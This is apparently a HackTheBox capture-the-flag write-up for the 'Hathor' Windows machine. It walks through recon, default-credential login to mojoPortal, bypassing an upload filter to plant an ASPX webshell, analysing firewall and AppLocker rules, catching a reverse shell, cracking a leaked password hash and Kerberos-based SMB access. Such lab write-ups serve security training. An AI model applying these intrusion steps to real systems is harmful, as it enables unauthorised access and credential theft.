---
title: HTB: Hathor
url: https://0xdf.gitlab.io/2022/11/19/htb-hathor.html
date: 2022-11-19T14:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: htb-hathor, ctf, hackthebox, nmap, crackmapexec, aspx, mojoportal, default-creds, upload, webshell, burp, burp-repeater, defender, applocker, firewall, windows-firewall, youtube, insomnia-webshell, get-badpasswords, crackstation, kerberos, klist, kinit, wireshark, msfvenom, dll, visual-studio, shortcut, recycle-bin, certificate, pfx, windows-process-monitor, openssl, pkcs12, crackpkcs12, authenticode, sign, dcsync, ktutil, gettgt, evil-winrm, wmiexec, htb-anubis, htb-hackback, htb-scrambled, osep-like
---

![Hathor](https://0xdfimages.gitlab.io/img/hathor-cover.png)

Hathor is an insane box that lives up to the difficulty. I’ll start with some default creds logging into a mojoPortal website. From there, I’ll figure out how to upload a webshell, and copy it to get the right extension. All my efforts to get a shell are blocked, and I’ll do a deep dive analysis on the firewall and AppLocker settings. I’ll eventually get a shell by overwriting a Dll over SMB, and when that Dll is loaded, I get execution. Still, the running binary is blocked outbound at the firewall. I’ll have to use that execution to overwrite an approved Exe, and then get a shell calling that. To get the next user, I’ll find a code signing certificate in the recycle bin, and use it to modify a Get-bADpasswords script that I can trigger to run as the next user. From that last user, I’ll perform a DCSync attack to get the admin’s hash. NTLM is disabled, so I’ll show a couple ways to use that hash to get a Kerberos ticket and execution on the box.

## Box Info

| Name | [Hathor](https://hackthebox.com/machines/hathor)  [Hathor](https://hackthebox.com/machines/hathor) [Play on HackTheBox](https://hackthebox.com/machines/hathor) |
| --- | --- |
| Release Date | [16 Apr 2022](https://twitter.com/hackthebox_eu/status/1514627048412749825) |
| Retire Date | 19 Nov 2022 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Hathor |
| Radar Graph | Radar chart for Hathor |
| First Blood User | 03:37:04[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 03:39:44[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [4ndr34z 4ndr34z](https://app.hackthebox.com/users/55079) |

## Recon

### nmap

`nmap` finds a bunch of open ports as is typical of Windows:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.147
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-08 19:14 UTC
Nmap scan report for 10.10.11.147
Host is up (0.086s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49701/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.12 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.147
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-08 19:24 UTC
Nmap scan report for 10.10.11.147
Host is up (0.086s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 29 disallowed entries (15 shown)
| /CaptchaImage.ashx* /Admin/ /App_Browsers/ /App_Code/ 
| /App_Data/ /App_Themes/ /bin/ /Blog/ViewCategory.aspx$ 
| /Blog/ViewArchive.aspx$ /Data/SiteImages/emoticons /MyPage.aspx 
|_/MyPage.aspx$ /MyPage.aspx* /NeatHtml/ /NeatUpload/
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Home - mojoPortal
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-08 19:24:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
|_ssl-date: 2022-11-08T19:27:08+00:00; +3s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
|_ssl-date: 2022-11-08T19:27:08+00:00; +3s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
|_ssl-date: 2022-11-08T19:27:08+00:00; +3s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2022-03-18T07:51:40
|_Not valid after:  2023-03-18T07:51:40
|_ssl-date: 2022-11-08T19:27:08+00:00; +3s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=11/8%Time=636AACDC%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: HATHOR; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-11-08T19:26:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.25 seconds

```

With LDAP (389), Kerberos (88), DNS (53), and SMB (445) all open, this is likely a Windows domain controller. The clock-skew seems ok (only 3 seconds), which is worth nothing if I get to any Kerberos auth.

Several scripts show a domain name of windcorp.htb, and the TLS certificate on the LDAP TLS ports (like 636, 3268, and 3269) shows the hostname `hathor.windcorp.htb` (I’ll add both to my `/etc/hosts` file and comment out any lingering entries from [Anubis](/2022/01/29/htb-anubis.html)). A quick fuzz for subdomains doesn’t find anything else.

I’ll note the high priority ports for enumeration:
- HTTP (80)
- SMB (445) - Check for guest access

I’ll also note to check things like DNS (53), RPC (445), and LDAP (389) if I can’t find a path from those, and note that WinRM (5985) is open if I find creds to a user who might be in the remote users group.

The [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) shows that the OS is Windows 10 / Server 2016 or newer.

### SMB - TCP 445

I’ll use `crackmapexec` to try to list shares:

```

oxdf@hacky$ crackmapexec smb 10.10.11.147 --shares -u guest
SMB         10.10.11.147    445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         10.10.11.147    445    NONE             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
oxdf@hacky$ crackmapexec smb 10.10.11.147 --shares
SMB         10.10.11.147    445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         10.10.11.147    445    NONE             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
oxdf@hacky$ crackmapexec smb 10.10.11.147 --shares -u guest -p ''
SMB         10.10.11.147    445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         10.10.11.147    445    NONE             [-] \guest: STATUS_NOT_SUPPORTED 

```

It is interesting that the last error message is `STATUS_NOT_SUPPORTED`. This typically means that NTLM auth is disabled (like in [Scrambled](/2022/10/01/htb-scrambled-linux.html#kerberoast)).

I get the same result with `smbclient`:

```

oxdf@hacky$ smbclient -N -L //10.10.11.147
session setup failed: NT_STATUS_NOT_SUPPORTED

```

### Website - TCP 80

#### Site

Visiting the site any way (IP, either domain name) returns the same page regardless. It’s under construction, and it says it will be a new intranet site:

![image-20221108152554825](https://0xdfimages.gitlab.io/img/image-20221108152554825.png)

The “Login” link at the bottom right leads to `http://hathor.windcorp.htb/Secure/Login.aspx?returnurl=%2f`, and shows a form:

![image-20221108152633710](https://0xdfimages.gitlab.io/img/image-20221108152633710.png)

The “Recover Password” link provides a form, and offers a chance to enumerate user:

![image-20221108152718535](https://0xdfimages.gitlab.io/img/image-20221108152718535.png)

The “Create Account” link leads to another form, which I’ll fill out:

![image-20221108152815270](https://0xdfimages.gitlab.io/img/image-20221108152815270.png)

On submitting, it works, and I’m logged in. The site is very sparse, though there is a Member List page:

![image-20221108152929718](https://0xdfimages.gitlab.io/img/image-20221108152929718.png)

I’ll note “Admin” user. Their profile doesn’t give any additional information.

#### Tech Stack

On logging off, the redirect is back to `Default.aspx`, which shows the kind of pages in use here. The HTTP headers fit this, with the `X-Powered-By` header:

```

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Tue, 08 Nov 2022 21:19:17 GMT
Connection: close
Content-Length: 12152

```

Looking at the page source, there are several references to “mojoPortal”:

[![image-20221108162412798](https://0xdfimages.gitlab.io/img/image-20221108162412798.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221108162412798.png)

[mojoPortal](https://www.mojoportal.com/) is a Windows-based content management system (CMS) like WordPress, Drupal, or Joomla.

## Shell as web

### Admin Access to mojoPortal

#### Find Default Creds

[This forum post](https://www.mojoportal.com/Forums/Thread.aspx?pageid=5&t=2902~-1#:~:text=Enter%20%22admin%40admin.com,and%20%22admin%22%20for%20Password.) shows the default username and password for mojoPortal to be admin@admin.com / admin.

![image-20221108162954403](https://0xdfimages.gitlab.io/img/image-20221108162954403.png)

If it’s not clear from that post, I can download the source code, and looking through it, there’s a message template that gives this information more clearly, `wwwroot/Data/MessageTemplates/en-US-InitialSiteHomeContent.config` (shown here viewed in Firefox):

![image-20221108164010197](https://0xdfimages.gitlab.io/img/image-20221108164010197.png)

#### Login

Entering those creds works to log in as the admin user:

![image-20221108164821657](https://0xdfimages.gitlab.io/img/image-20221108164821657.png)

There’s a lot more options in the sidebar.

### Webshell Execution

#### Enumerate mojoPortal

Under Administration -> System Information, it shows the version of mojoPortal, the OS, and the plugins:

![image-20221109075953053](https://0xdfimages.gitlab.io/img/image-20221109075953053.png)

#### Vulnerabilities

`searchsploit` finds two vulnerabilities in mojoPortal:

```

oxdf@hacky$ searchsploit mojoportal
[i] Found (#2): /opt/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
mojoportal - Multiple Vulnerabilities                      | asp/webapps/15018.txt
mojoPortal forums 2.7.0.0 - 'Title' Persistent Cross-Site  | multiple/webapps/49184.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

The first result is for version 2.3.4.3, which is much older than the one on Hathor. The second is a XSS vulnerability in the matching version, but given that I already have admin access on the site and I know there are no other users, it’s not clear what this might get me.

#### File Upload

There’s a File Manager option in the admin sidebar, and it shows the site, as well as has a drop down with the option to upload files:

![image-20221109082001429](https://0xdfimages.gitlab.io/img/image-20221109082001429.png)

I’ll try to upload a [simple ASPX webshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx), but it’s blocked:

![image-20221109081204186](https://0xdfimages.gitlab.io/img/image-20221109081204186.png)

Looking at the request in Burp Repeater, the upload is attempted, but the server rejects it:

[![image-20221109081315987](https://0xdfimages.gitlab.io/img/image-20221109081315987.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221109081315987.png)

If I change the filename to `cmd.txt`, it seems to work:

[![image-20221109081404798](https://0xdfimages.gitlab.io/img/image-20221109081404798.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221109081404798.png)

And it shows up in the File Manager:

![image-20221109081436703](https://0xdfimages.gitlab.io/img/image-20221109081436703.png)

#### Find File

I’ll notice that my uploaded `cmd.txt` is in the same directory as `underconstruction.png`. From the home page, I’ll right click on that image and “Open Image in New Tab” to see the URL is `http://10.10.11.147/Data/Sites/1/media/underconstruction.png`. Changing the file name to `cmd.txt` shows the webshell:

![image-20221109081754377](https://0xdfimages.gitlab.io/img/image-20221109081754377.png)

#### Get .aspx Extension

To get this webshell to execute, it’ll have to have a `.aspx` extension. I’ll right-click on `cmd.txt` and there’s a few options that might help:

![image-20221109081818386](https://0xdfimages.gitlab.io/img/image-20221109081818386.png)

Trying “Rename” gives a similar error as when trying to upload (from the server, not client-side):

![image-20221109081847652](https://0xdfimages.gitlab.io/img/image-20221109081847652.png)

The POST body shows it tries the new path, but the response shows it’s not allow:

![image-20221109082857519](https://0xdfimages.gitlab.io/img/image-20221109082857519.png)

The “Move” option only allows a change of folder, not of filename:

```

{"action":"list","path":"/logos"}

```

So I can move it to a new folder, but not to a new name.

The “Copy” option GUI let’s me select folder and filename:

![image-20221109085802849](https://0xdfimages.gitlab.io/img/image-20221109085802849.png)

This looks successful:

![image-20221109090027260](https://0xdfimages.gitlab.io/img/image-20221109090027260.png)

The file doesn’t show up in the File Manager, but it is there:

![image-20221109090141012](https://0xdfimages.gitlab.io/img/image-20221109090141012.png)

### Shell

#### Fails

A bunch of the things I try with PowerShell fail. For example, trying PowerShell #3 (Base64) from <https://www.revshells.com/> returns a message that it’s blocked by AV:

![image-20221109093055716](https://0xdfimages.gitlab.io/img/image-20221109093055716.png)

I also am unable to get PowerShell to upload files using `Invoke-WebRequest` (or `wget`). No connection comes back to my webserver.

Checking PowerShell, it is running in ConstrainedLanguage mode for this user:

![image-20221109092913967](https://0xdfimages.gitlab.io/img/image-20221109092913967.png)

I’ll also try uploading `nc64.exe` via the File Manager (first as `nc64.txt`, and then copying). It seems to work, because while it doesn’t show up in the File Manager, visiting it’s URL downloads the binary.

However, when I try to call `nc64.exe`, it doesn’t connect back. This could be some AppLocker rules. Or firewall blocking outbound connections.

There are other slightly odd things behaviors as well. For example, `net user` doesn’t return anything:

![image-20221109121557571](https://0xdfimages.gitlab.io/img/image-20221109121557571.png)

But `net user web` does:

![image-20221109121627700](https://0xdfimages.gitlab.io/img/image-20221109121627700.png)

Something is messing with what executes.

#### Firewall and AppLocker

To understand what I’m going again, I’ll want to enumerate the Firewall and AppLocker policies in player. I’ll review all of this in [this video](https://www.youtube.com/watch?v=w_Kro3S4xE8):

To get the Firewall blocks, I’ll run `powershell.exe -c Get-NetFirewallRule -PolicyStore ActiveStore | where { $_.Action -eq \"Block\" }`. This returns 16 rules, all outbound, blocking by program. The following programs are blocked: `cscript`, PowerShell, PowerShell ISE, `regsvr32`, `rundll32`, `wscript`, `certutil`, `certoc`, and `AutoIt`. All but the last two have blocks for both 32- and 64-bit.

I’ll dump the AppLocker policy with PowerShell:

![image-20221109123606820](https://0xdfimages.gitlab.io/img/image-20221109123606820.png)

It runs off the page in one very long line. I’ll copy that into a file, and open it in VSCode to look at it (see the above video for details). In summary the following are allowed to run:
- Appx - Only signed
- Dll
  - Signed by Microsoft
  - In Program Files and Windows folders
  - Run by admin group
  - `C:\share\scripts\7-zip64.dll` or `C:\Get-bADpasswords\PSI\Psi_x64.dll`
- Exe
  - Explicitly blocks known AppLocker bypasses even signed by Microsoft, including `MSDT.exe`, `PRESENTATIONHOST.exe`, `MSHTA.exe`, `MSBUILD.exe`, `INSTALLUTIL.exe`
  - Allow Signed by `administrator@windcorp.com`, AutoIt, or Microsoft (if not in above)
  - Explicitly blocks known paths, like `%SYSTEM#2%\Tasks:*`, `%SYSTEM32%\regvr32`, `%SYSTEM32%\spool\drivers\color:*`, etc.
  - In Program Files and Windows folders
  - Run by admin group
  - `C:\share\Bginfo64.exe`.
- Msi
  - Signed
  - In `C:\Windows\Installer`
  - Run by admin group
- Scripts
  - Signed by administrator@windcorp.htb
  - In Program Files and Windows folders
  - Run by admin group
  - `C:\script\login.cmd`

#### Insomnia

Since I know that both PowerShell and unsigned binaries like `nc64.exe` are going to fail connecting out, I’ll try a more full-featured webshell, like [Insomnia](https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx). It has a built in reverse shell capability:

[![image-20221109122225232](https://0xdfimages.gitlab.io/img/image-20221109122225232.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221109122225232.png)

Because this executed all within the context of the IIS process, it should be able to succeed where my attempts via PowerShell and `nc64.exe` were blocked. I’ll upload it:

![image-20221109122318968](https://0xdfimages.gitlab.io/img/image-20221109122318968.png)

On pushing “Connect Back Shell”, I get a shell at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.11.147 50060
Shell enroute.......
Microsoft Windows [Version 10.0.20348.643]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
windcorp\web

```

## SMB as BeatriceMill

### Enumeration

#### Home Directories

There’s nothing of interest in `C:\users\web`. There are several other users with home directories:

```

c:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\Users

02/16/2022  10:00 PM    <DIR>          .
02/15/2022  09:04 PM    <DIR>          .NET v4.5
02/15/2022  09:04 PM    <DIR>          .NET v4.5 Classic
10/05/2021  05:44 PM    <DIR>          AbbyMurr
03/25/2022  03:51 PM    <DIR>          Administrator
10/01/2021  05:49 PM    <DIR>          BeatriceMill
10/03/2021  04:13 PM    <DIR>          bpassrunner
03/21/2022  02:48 PM    <DIR>          GinaWild
09/24/2021  07:26 AM    <DIR>          Public
03/17/2022  02:46 PM    <DIR>          web
               0 File(s)              0 bytes
              10 Dir(s)   9,256,456,192 bytes free

```

web can’t access any of them.

#### Root of C:\

At the root of the file system, there are a few unusual directories:

```

c:\>dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\

10/12/2022  08:30 PM    <DIR>          Get-bADpasswords
10/02/2021  07:24 PM    <DIR>          inetpub
10/07/2021  08:38 AM    <DIR>          Microsoft
05/08/2021  09:20 AM    <DIR>          PerfLogs
03/25/2022  08:54 PM    <DIR>          Program Files
02/15/2022  08:42 PM    <DIR>          Program Files (x86)
12/29/2021  10:17 PM    <DIR>          script
11/09/2022  06:51 PM    <DIR>          share
07/07/2021  06:05 PM    <DIR>          StorageReports
02/16/2022  10:00 PM    <DIR>          Users
04/19/2022  01:44 PM    <DIR>          Windows
               0 File(s)              0 bytes
              11 Dir(s)   9,256,259,584 bytes free

```

`Get-bADpasswords` has a bunch of PowerShell scripts. I’ll look at this below.

`inetpub` has the web stuff.

`script` is not accessible.

`StorageReports` has a empty `Scheduled` directory.

#### Get-bADpasswords

The directory has a copy of [this GitHub repo](https://github.com/improsec/Get-bADpasswords):

```

c:\Get-bADpasswords>dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\Get-bADpasswords

10/12/2022  08:30 PM    <DIR>          .
09/29/2021  07:18 PM    <DIR>          Accessible
10/12/2022  09:04 PM            11,694 CredentialManager.psm1
03/21/2022  02:59 PM            20,320 Get-bADpasswords.ps1
09/29/2021  05:53 PM           177,250 Get-bADpasswords_2.jpg
10/12/2022  09:04 PM             5,184 Helper_Logging.ps1
10/12/2022  09:04 PM             6,561 Helper_Passwords.ps1
09/29/2021  05:53 PM           149,012 Image.png
09/29/2021  05:53 PM             1,512 LICENSE.md
10/12/2022  09:04 PM             4,499 New-bADpasswordLists-Common.ps1
10/12/2022  09:04 PM             4,335 New-bADpasswordLists-Custom.ps1
10/12/2022  09:04 PM             4,491 New-bADpasswordLists-customlist.ps1
10/12/2022  09:04 PM             4,740 New-bADpasswordLists-Danish.ps1
10/12/2022  09:04 PM             4,594 New-bADpasswordLists-English.ps1
10/12/2022  09:04 PM             4,743 New-bADpasswordLists-Norwegian.ps1
09/29/2021  05:54 PM    <DIR>          PSI
09/29/2021  05:53 PM             6,567 README.md
10/12/2022  09:04 PM             3,982 run.vbs
09/29/2021  05:54 PM    <DIR>          Source
              15 File(s)        409,484 bytes
               4 Dir(s)   9,256,300,544 bytes free

```

`run.vbs` is not a part of that repo, but unique to Hathor. It’s a script that creates an Application event log with id 444:

```

Set WshShell = CreateObject("WScript.Shell")          
Command = "eventcreate /T Information /ID 444 /L Application /D " & _                                                              
    Chr(34) & "Check passwords" & Chr(34)             
WshShell.Run Command                                             
'' SIG '' Begin signature block                                  
'' SIG '' MIIIkgYJKoZIhvcNAQcCoIIIgzCCCH8CAQExDzANBglg
'' SIG '' hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor
'' SIG '' BgEEAYI3AgEeMCQCAQEEEE7wKRaZJ7VNj+Ws4Q8X66sC
'' SIG '' AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg
'' SIG '' V4iIgvjS/tzbdg7yzPOhQtBxr63sSQYGiJME4+J1oz6
...[snip]...

```

At the end, there’s a signature, which allows it to run under AppLocker.

`Get-bADpasswords.ps1` has a configuration section at the top of the script:

```

...[snip]...
$log_filename  = ".\Accessible\Logs\log_$domain_name-$current_timestamp.txt"
$csv_filename  = ".\Accessible\CSVs\exported_$domain_name-$current_timestamp.csv"

$write_to_log_file = $true
$write_to_csv_file = $true
$write_hash_to_logs = $true
...[snip]...

```

`$write_hash_to_logs` is interesting, because it implies it might be logging the bad passwords.

Looking in `Accessible\CVSs`, there are a bunch of files:

```

c:\Get-bADpasswords\Accessible\CSVs>dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\Get-bADpasswords\Accessible\CSVs

11/09/2022  04:06 PM    <DIR>          .
09/29/2021  07:18 PM    <DIR>          ..
10/03/2021  04:35 PM               248 exported_windcorp-03102021-173510.csv
10/03/2021  05:07 PM               248 exported_windcorp-03102021-180635.csv
10/03/2021  05:21 PM               112 exported_windcorp-03102021-182114.csv
10/03/2021  05:22 PM               112 exported_windcorp-03102021-182259.csv
10/03/2021  05:28 PM               248 exported_windcorp-03102021-182627.csv
10/03/2021  05:52 PM               248 exported_windcorp-03102021-185058.csv
10/04/2021  10:37 AM               248 exported_windcorp-04102021-113140.csv
10/05/2021  05:40 PM               248 exported_windcorp-05102021-183949.csv
11/06/2022  04:44 AM               248 exported_windcorp-06112022-044054.csv
11/07/2022  04:43 AM               248 exported_windcorp-07112022-044054.csv
11/08/2022  04:43 AM               248 exported_windcorp-08112022-044053.csv
11/09/2022  04:43 AM               248 exported_windcorp-09112022-044054.csv
11/09/2022  04:08 PM               248 exported_windcorp-09112022-160559.csv
10/13/2022  08:13 PM               248 exported_windcorp-13102022-210856.csv
10/13/2022  08:13 PM               248 exported_windcorp-13102022-210946.csv
03/17/2022  04:40 AM               112 exported_windcorp-17032022-044053.csv
03/18/2022  04:40 AM               112 exported_windcorp-18032022-044046.csv
              17 File(s)          3,672 bytes
               2 Dir(s)   9,254,928,384 bytes free

```

Looking at the most recent one, it’s got a hash for the BeatriceMill user:

```

c:\Get-bADpasswords\Accessible\CSVs>type exported_windcorp-09112022-160559.csv
type exported_windcorp-09112022-160559.csv
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passwords-v7'

```

### Crack Hash

Given that this hash is in common wordlists, it makes sense that I’ll find it on [crackstation](https://crackstation.net/):

![image-20221109131039749](https://0xdfimages.gitlab.io/img/image-20221109131039749.png)

”!!!!ilovegood17” is the password.

### Access SMB

#### NTLM Fails

Trying these creds with `crackmapexec` and `smbclient` both fail with the same error message:

```

oxdf@hacky$ crackmapexec smb hathor.windcorp.htb -u beatricemill -p '!!!!ilovegood17'
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [*]  x64 (name:hathor.windcorp.htb) (domain:hathor.windcorp.htb) (signing:True) (SMBv1:False)
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [-] hathor.windcorp.htb\beatricemill:!!!!ilovegood17 STATUS_NOT_SUPPORTED 

oxdf@hacky$ smbclient -L //10.10.11.147 -U windcorp.htb\\BeatriceMill                            
Enter WINDCORP.HTB\BeatriceMill's password:
session setup failed: NT_STATUS_NOT_SUPPORTED 

```

This is the error message that comes back when NTLM authentication is disabled.

#### Kerberos Configuration

I’ll update my `/etc/krb5.conf` file with this domain:

```

[libdefaults]   
    	default_realm = WINDCORP.HTB
        fcc-mit-ticketflags = true

[realms]
        WINDCORP.HTB = {
                kdc = HATHOR.WINDCORP.HTB
                admin_server = HATHOR.WINDCORP.HTB
        }

```

Now I’ll run `kinit` to get a ticket as beatricemills:

```

oxdf@hacky$ kinit beatricemill
Password for beatricemill@WINDCORP.HTB: 

```

On entering the password, it just returns, but with `klist` I can see the ticket exists:

```

oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: beatricemill@WINDCORP.HTB

Valid starting       Expires              Service principal
11/09/2022 18:31:49  11/10/2022 04:31:49  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 11/10/2022 18:31:42

```

#### smbclient

The standard `smbclient` can take the `-k` option to use this cached Kerberos ticket. Still, it is likely to return this error now:

```

oxdf@hacky$ smbclient -L //hathor.windcorp.htb -U beatricemill@windcorp.htb -N -k 
gensec_spnego_client_negTokenInit_step: gse_krb5: creating NEG_TOKEN_INIT for cifs/hathor.windcorp.htb failed (next[(null)]): NT_STATUS_NO_LOGON_SERVERS                                            
session setup failed: NT_STATUS_NO_LOGON_SERVERS  

```

If I run that again with WireShark open, There’s a bunch of DNS requests with unfound responses:

[![image-20221109140734067](https://0xdfimages.gitlab.io/img/image-20221109140734067.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221109140734067.png)

I’ll set my own name server to include 10.10.11.147 in `/etc/resolve.conf`, and now it hangs, for a while, but eventually returns after it gets a successful resolution for `hathor.windcorp.htb`:

```

oxdf@hacky$ smbclient -L //hathor.windcorp.htb -U beatricemill@windcorp.htb -N -k 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        share           Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

#### CrackMapExec

Alternatively, `crackmapexec` can still show the shares using the following arguments:
- `smb` - protocol to use
- `hathor.windcorp.htb` - the full hostname, not the IP or domain name (this is important for Kerberos)
- `-k` - use kerberos auth
- `-d windcorp.htb` - domain
- `-u beatricemill` - username
- `-p '!!!!ilovegood17'` - password
- `--shares` - list the shares

It results in the shares:

```

oxdf@hacky$ crackmapexec smb hathor.windcorp.htb -k -d windcorp.htb -u beatricemill -p '!!!!ilovegood17' --shares 
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [*]  x64 (name:hathor.windcorp.htb) (domain:windcorp.htb) (signing:True) (SMBv1:False)
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [+] windcorp.htb\beatricemill:!!!!ilovegood17 
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [+] Enumerated shares
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb Share           Permissions     Remark
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb -----           -----------     ------
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb ADMIN$                          Remote Admin
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb C$                              Default share
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb IPC$            READ            Remote IPC
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb NETLOGON        READ            Logon server share 
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb share           READ,WRITE      
SMB         hathor.windcorp.htb 445    hathor.windcorp.htb SYSVOL          READ            Logon server share 

```

#### Impacket smbclient.py

The Impacket version of `smbclient.py` also works without setting the name server:

```

oxdf@hacky$ smbclient.py -k 'windcorp.htb/beatricemill:!!!!ilovegood17@hathor.windcorp.htb'
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
share
SYSVOL

```

## Shell as GinaWild

### Enumerate share Share

